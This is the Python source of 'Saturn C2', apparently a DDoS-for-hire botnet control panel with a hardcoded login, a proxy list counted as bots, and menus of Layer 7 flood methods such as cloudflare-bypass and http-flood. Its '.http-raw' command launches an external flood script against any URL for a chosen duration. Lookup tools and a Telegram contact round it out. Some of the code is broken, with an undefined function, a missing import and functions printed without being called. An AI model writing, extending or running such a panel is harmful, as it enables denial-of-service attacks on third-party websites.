#CREATE DATE 10/04/2023
#!/usr/bin/env python3
#-*- coding: utf-8 -*-
import sys
import socket 
from colorama import Fore
import random
import requests
import pkg_resources
import time
from pystyle import Colors, Colorate, Center
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
import random
import threading
import getpass
import os
import urllib
import json

def clear():
    os.system('cls' if os.name == 'nt' else 'clear')
    
proxys = open('proxies.txt').readlines()
bots = len(proxys)

ip= requests.get('https://api.ipify.org').text.strip()

###COPYRIGHT tool###
def si():
    print('       \x1b[38;2;0;255;255m[ \x1b[38;2;233;233;233mSaturn \x1b[38;2;0;255;255m] | \x1b[38;2;233;233;233mWelcome to Saturn C2! \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mOwner: @HazelX.14 \x1b[38;2;0;255;255m| \x1b[38;2;233;233;233mVersion: 1.0')

# Validate IP
def validate_ip(ip):
    parts = ip.split('.')
    return len(parts) == 4 and all(x.isdigit() for x in parts) and all(0 <= int(x) <= 255 for x in parts) and not ipaddress.ip_address(ip).is_private

# Validate Port
def validate_port(port, rand=False):
    if rand:
        return port.isdigit() and int(port) >= 0 and int(port) <= 65535
    else:
        return port.isdigit() and int(port) >= 1 and int(port) <= 65535

# Validate attack time
def validate_time(time):
    return time.isdigit() and int(time) >= 10 and int(time) <= 1300

# Validate buffer size
def validate_size(size):
    return size.isdigit() and int(size) > 1 and int(size) <= 65500

#My IP#
def mip():
    print(f"""\x1b[0mYour IP Is \x1b[40;38;2;127;0;255m{ip}\x1b[0m""")
#Account#
def account():
    print(f"""\x1b[0mID: \x1b[38;2;255;0;255mUnknown\x1b[0m
\x1b[0mUsername: \x1b[38;2;255;0;255mHazel
\x1b[0mAdmin: false
\x1b[0mReseller: false
\x1b[0mVIP: false
\x1b[0mBypass Blacklist: true

\x1b[0mExpiry: \x1b[38;2;255;0;255m30\x1b[0m Day(s)
\x1b[0mMaxTime: \x1b[38;2;255;0;255m99999 \x1b[0mSeconds
\x1b[0mCooldown: \x1b[38;2;255;0;255m0\x1b[0m Seconds
\x1b[0mConcurrents: \x1b[38;2;255;0;255m1\x1b[0m
\x1b[0mMax Sessions: \x1b[38;2;255;0;255m4\x1b[0m
\x1b[0mMy Attacks Sent: \x1b[38;2;255;0;255mUnknow\x1b[0m
\x1b[0mCurrent IPv4: \x1b[38;2;255;0;255m{ip}\x1b[0m""")

def layer7():
    os.system('clear')
    si()
    print(f'''
                              \x1b[38;2;0;212;14m╔═══════════════╗
                              \x1b[38;2;0;212;14m║    \x1b[38;2;0;255;255mLayer 7    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╔══════════════╩════════╦══════╩══════════════╗
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mgoat-bypass         \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcloudflare-uam    \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-fuzz           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mnormal-bypass     \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-dstat          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mcf-bypass         \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mautobypass          \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttps-bypass      \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-rand           \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255m100up-bypass      \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-raw            \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-flood        \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-overflow       \x1b[38;2;0;212;14m║   \x1b[38;2;0;255;255mhttp-get          \x1b[38;2;0;212;14m║
               \x1b[38;2;0;212;14m╚═══════════════════════╩═════════════════════╝
''')

def tools():
    clear()
    si()
    print(f'''
                                \x1b[38;2;0;212;14m╔═══════════════╗
                                \x1b[38;2;0;212;14m║     \x1b[38;2;0;255;255mTools     \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╔═══════════════╩══════╦════════╩═══════════════╗
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mgeoip               \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverse-dns           \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mreverseip           \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║  
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255msubnet-lookup       \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255masn-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255mdns-lookup          \x1b[38;2;0;212;14m║  \x1b[38;2;0;255;255m<empty>               \x1b[38;2;0;212;14m║
                \x1b[38;2;0;212;14m╚══════════════════════╩════════════════════════╝
''')

banner = """
         ,MMM8&&&.
    _...MMMMM88&&&&..._
.::'''MMMMM88&&&&&&'''::.
::     MMMMM88&&&&&&     ::
'::....MMMMM88&&&&&&....::'
   `''''MMMMM88&&&&''''`
         'MMM8&&&'
"""

def menu():
    sys.stdout.write(f"\x1b]2;Saturn Botnet | Plant: [100$] | Device: [{bots}] | Methods: [?] | Expired: [365 Days] | Username: [Hazel@Saturn]\x07")
    os.system('cls' if os.name == 'nt' else 'clear')
    si()
    
def main():
    while(True):
        cnc = input(f"""\x1b[38;2;239;239;239m┏━━[\x1b[38;2;255;99;71mHazelX\x1b[38;2;239;239;239m] - [\x1b[38;2;255;234;0mSaturn\x1b[38;2;239;239;239m]\n\x1b[38;2;239;239;239m┗━━➤ """)
        if cnc == "?" or cnc == "???" or cnc == "???":
            os.system('clear')
            print (banner)
        if cnc == ".METHODS" or cnc == ".methods" or cnc == ".Methods":
            meth()
        elif cnc == "CLEAR" or cnc == "clear" or cnc == "cls":
            os.system('clear')
            main()
        elif cnc == ".MYIP" or cnc == ".myip" or cnc == ".ip":
            print (mip)
        if cnc == ".TOOLS" or cnc == ".Tools" or cnc == ".tools":
            tools()
        elif cnc == ".ACCOUNT" or cnc == ".Account" or cnc == ".account":
            print (account)
        elif cnc == ".LAYER7" or cnc == ".layer7" or cnc == ".l7":
            layer7()
        elif cnc ==".TELEGRAM" or cnc == ".Telegram" or cnc == ".telegram":
            print("\x1b[38;2;0;255;255mhttps://t.me/saturnc2")
        elif cnc ==".ADMIN" or cnc == ".Admin" or cnc == ".admin":
            print("\x1b[38;2;0;255;255mHazelX14")
            
            #Layer 7 Service#
        elif ".http-raw" in cnc:
            try:
                url=cnc.split()[1]
                time=cnc.split()[2]
                method=cnc.split()[3]
                os.system(f'node ./data/HTTP-RAW.js {url} {time} {method}')
                os.system('cls' if os.name == 'nt' else 'clear')
            except IndexError:
                print("Usage : http-raw <url> <time>")
                print("Example : http-raw https://github.com/ 60 POST/GET")
                
        elif "geoip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/geoip/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: geoip <ip>')
                print('Example: geoip 1.1.1.1')

        elif "reverseip" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reverseiplookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverseip <ip>')
                print('Example: reverseip 1.1.1.1')
                
        elif "subnet-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/subnetcalc/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: subnet-lookup <cdr/ip + netmask>')
                print('Example: subnet-lookup 192.168.1.0/24')

        elif "asn-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/aslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: asn-lookup <ip/asn>')
                print('Example: asn-lookup AS15169')

        elif "dns-lookup" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/dnslookup/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: dns-lookup <dns>')
                print('Example: dns-lookup google.com')

        elif "reverse-dns" in cnc:
            try:
                ip = cnc.split()[1]
                try:
                    r = requests.get(f'https://api.hackertarget.com/reversedns/?q={ip}')
                    print(r.text)
                except:
                    print("[ API Error :( ]")
            except IndexError:
                print('Usage: reverse-dns <ip/domain>')
                print('Example: reverse-dns 8.8.8.8')
                
        elif ".help" in cnc:
            print(f'''
                                ═════════╦════════════════╦══════════
                        ╔════════════════╩════════════════╩════════════════╗
             ╔══════════╩══════════╦══╦═════════════════════╦═══╦══════════╩══════════╗
             ║  layer7             ║ L║  game               ║ L ║  tools              ║
             ║  layer4             ║  ║  rules              ║   ║  cls                ║
             ║  amp                ║  ║  ports              ║   ║  <empty>            ║
             ╚═════════════════════╩══╩═════════════════════╩═══╩═════════════════════╝

            ''')
        else:
            try:
                cmmnd = cnc.split()[0]
                print("Command: [ " + cmmnd + " ] Not Found!")
            except IndexError:
                pass
                
def login():
    clear()
    user = "HazelX"
    passwd = "14"
    username = input("</> Username: ")
    password = getpass.getpass(prompt='</> Password: ')
    if username != user or password != passwd:
        print("")
        print("</> Invalid credentials! Abandoning...")
        sys.exit(1)
    elif username == user and password == passwd:
        print("</> Welcome to Saturn C2!")
        os.system('clear')
        time.sleep(0.3)
        menu()
        print (banner)
        main()

login()